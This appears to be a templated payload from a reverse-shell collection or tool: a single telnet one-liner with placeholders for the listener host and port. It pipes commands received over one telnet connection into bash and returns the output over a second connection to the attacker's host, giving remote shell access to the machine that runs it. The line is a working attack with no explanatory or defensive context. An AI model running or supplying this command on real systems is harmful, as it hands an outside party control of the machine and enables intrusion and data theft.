telnet {{ LHOST }} {{ LPORT }} | bash | telnet {{ LHOST }} $(( {{ LPORT+1 }} ))
